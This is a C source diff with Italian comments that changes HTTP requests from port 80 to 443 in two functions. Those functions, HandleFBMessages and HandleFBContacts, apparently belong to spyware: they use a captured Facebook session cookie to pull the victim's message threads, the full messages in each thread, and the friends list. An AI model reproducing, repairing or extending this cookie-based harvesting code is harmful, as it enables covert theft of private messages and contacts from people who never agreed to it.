@@ -141,7 +141,7 @@ DWORD HandleFBMessages(char *cookie)
 		return SOCIAL_REQUEST_NETWORK_PROBLEM;
 	
 	// Identifica l'utente
-	ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", L"/home.php?", 80, NULL, 0, &r_buffer, &response_len, cookie);	
+	ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", L"/home.php?", 443, NULL, 0, &r_buffer, &response_len, cookie);	
 	if (ret_val != SOCIAL_REQUEST_SUCCESS)
 		return ret_val;
 	parser1 = (BYTE *)strstr((char *)r_buffer, "\"user\":\"");
@@ -189,7 +189,7 @@ DWORD HandleFBMessages(char *cookie)
 		return SOCIAL_REQUEST_BAD_COOKIE;
 
 	// Costruisce il contenuto per le successive POST ajax
-	ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", L"/messages/", 80, NULL, 0, &r_buffer, &response_len, cookie);	
+	ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", L"/messages/", 443, NULL, 0, &r_buffer, &response_len, cookie);	
 	if (ret_val != SOCIAL_REQUEST_SUCCESS)
 		return ret_val;
 	parser1 = (BYTE *)strstr((char *)r_buffer, FB_POST_FORM_ID);
@@ -227,7 +227,7 @@ DWORD HandleFBMessages(char *cookie)
 
 	// Chiede la lista dei thread
 	swprintf_s(fb_request, L"ajax/messaging/async.php?sk=inbox&offset=0&limit=%d&__a=1", FACEBOOK_THREAD_LIMIT);
-	ret_val = HttpSocialRequest(L"www.facebook.com", L"POST", fb_request, 80, (BYTE *)post_data, strlen(post_data), &r_buffer, &response_len, cookie);
+	ret_val = HttpSocialRequest(L"www.facebook.com", L"POST", fb_request, 443, (BYTE *)post_data, strlen(post_data), &r_buffer, &response_len, cookie);
 	
 	if (ret_val != SOCIAL_REQUEST_SUCCESS)
 		return ret_val;
@@ -279,7 +279,7 @@ DWORD HandleFBMessages(char *cookie)
 		parser1 = parser2 + 1;
 
 		// Pe ogni thread chiede tutti i rispettivi messaggi
-		ret_val = HttpSocialRequest(L"www.facebook.com", L"POST", url, 80, (BYTE *)post_data, strlen(post_data), &r_buffer_inner, &dummy, cookie);
+		ret_val = HttpSocialRequest(L"www.facebook.com", L"POST", url, 443, (BYTE *)post_data, strlen(post_data), &r_buffer_inner, &dummy, cookie);
 		if (ret_val != SOCIAL_REQUEST_SUCCESS) {
 			SAFE_FREE(r_buffer);
 			return ret_val;
@@ -447,7 +447,7 @@ DWORD HandleFBContacts(char *cookie)
 		return SOCIAL_REQUEST_SUCCESS;
 	
 	// Identifica l'utente
-	ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", L"/home.php?", 80, NULL, 0, &r_buffer, &response_len, cookie);	
+	ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", L"/home.php?", 443, NULL, 0, &r_buffer, &response_len, cookie);	
 	if (ret_val != SOCIAL_REQUEST_SUCCESS)
 		return ret_val;
 	parser1 = strstr((char *)r_buffer, "\"user\":\"");
@@ -471,7 +471,7 @@ DWORD HandleFBContacts(char *cookie)
 
 	// Chiede la lista dei contatti
 	_snwprintf_s(fb_request, sizeof(fb_request)/sizeof(WCHAR), _TRUNCATE, L"/ajax/typeahead/first_degree.php?__a=1&viewer=%S&token=v7&filter[0]=user&options[0]=friends_only&__user=%S", user, user);
-	ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", fb_request, 80, NULL, 0, &r_buffer, &response_len, cookie);
+	ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", fb_request, 443, NULL, 0, &r_buffer, &response_len, cookie);
 	if (ret_val != SOCIAL_REQUEST_SUCCESS)
 		return ret_val;
 
